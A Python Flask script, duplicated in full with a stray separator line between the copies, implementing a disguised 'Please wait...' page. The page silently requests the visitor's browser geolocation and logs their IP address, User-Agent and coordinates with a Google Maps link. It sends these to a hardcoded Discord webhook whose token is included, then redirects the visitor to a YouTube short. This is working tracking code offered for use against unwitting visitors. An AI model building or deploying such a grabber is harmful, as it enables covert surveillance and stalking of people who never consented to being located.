from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# Your Discord webhook (replace with yours!)
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1408082724153065524/tRuhF_l64XjrgZ2m3ogWewhKppnteSuXQyENsIzDLoNM7shkM1zjg0p4OrCQWwKmKZte"

# HTML + JavaScript
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
  <title>Checking...</title>
  <script>
    function sendLocation(position) {
      fetch("/log", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          lat: position.coords.latitude,
          lon: position.coords.longitude
        })
      }).then(() => {
        window.location.href = "https://youtube.com/shorts/OGd2y3nFfH8?si=TZ4_CIT4Uk9YyTr7"; // Redirect after logging
      });
    }

    function requestLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, function() {
          window.location.href = "https://youtube.com/shorts/OGd2y3nFfH8?si=TZ4_CIT4Uk9YyTr7"; // Redirect if denied
        });
      } else {
        window.location.href = "https://youtube.com/shorts/OGd2y3nFfH8?si=TZ4_CIT4Uk9YyTr7"; // Redirect if no GPS support
      }
    }

    window.onload = requestLocation;
  </script>
</head>
<body>
  <h2>Please wait...</h2>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/log", methods=["POST"])
def log():
    data = request.json
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent")

    lat = data.get("lat")
    lon = data.get("lon")
    maps_link = f"https://www.google.com/maps?q={lat},{lon}"

    message = {
        "content": f"🌍 New Visitor!\n\n**IP:** {ip}\n**UA:** {ua}\n**Location:** {lat}, {lon}\n**Google Maps:** {maps_link}"
    }

    requests.post(DISCORD_WEBHOOK, json=message)
    return {"status": "ok"}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
=======
from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# Your Discord webhook (replace with yours!)
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1408082724153065524/tRuhF_l64XjrgZ2m3ogWewhKppnteSuXQyENsIzDLoNM7shkM1zjg0p4OrCQWwKmKZte"

# HTML + JavaScript
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
  <title>Checking...</title>
  <script>
    function sendLocation(position) {
      fetch("/log", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          lat: position.coords.latitude,
          lon: position.coords.longitude
        })
      }).then(() => {
        window.location.href = "https://youtube.com/shorts/OGd2y3nFfH8?si=TZ4_CIT4Uk9YyTr7"; // Redirect after logging
      });
    }

    function requestLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, function() {
          window.location.href = "https://youtube.com/shorts/OGd2y3nFfH8?si=TZ4_CIT4Uk9YyTr7"; // Redirect if denied
        });
      } else {
        window.location.href = "https://youtube.com/shorts/OGd2y3nFfH8?si=TZ4_CIT4Uk9YyTr7"; // Redirect if no GPS support
      }
    }

    window.onload = requestLocation;
  </script>
</head>
<body>
  <h2>Please wait...</h2>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/log", methods=["POST"])
def log():
    data = request.json
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent")

    lat = data.get("lat")
    lon = data.get("lon")
    maps_link = f"https://www.google.com/maps?q={lat},{lon}"

    message = {
        "content": f"🌍 New Visitor!\n\n**IP:** {ip}\n**UA:** {ua}\n**Location:** {lat}, {lon}\n**Google Maps:** {maps_link}"
    }

    requests.post(DISCORD_WEBHOOK, json=message)
    return {"status": "ok"}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)

